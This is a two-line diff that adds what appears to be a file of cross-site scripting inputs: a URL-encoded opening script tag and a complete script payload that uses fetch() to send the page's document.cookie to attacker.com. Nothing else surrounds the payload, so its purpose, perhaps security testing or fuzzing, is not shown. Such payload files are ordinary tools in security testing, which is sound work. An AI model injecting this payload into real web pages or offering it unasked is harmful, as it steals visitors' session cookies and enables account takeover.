@@ -1,0 +1,2 @@
+%3Cscript%3E
+<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>
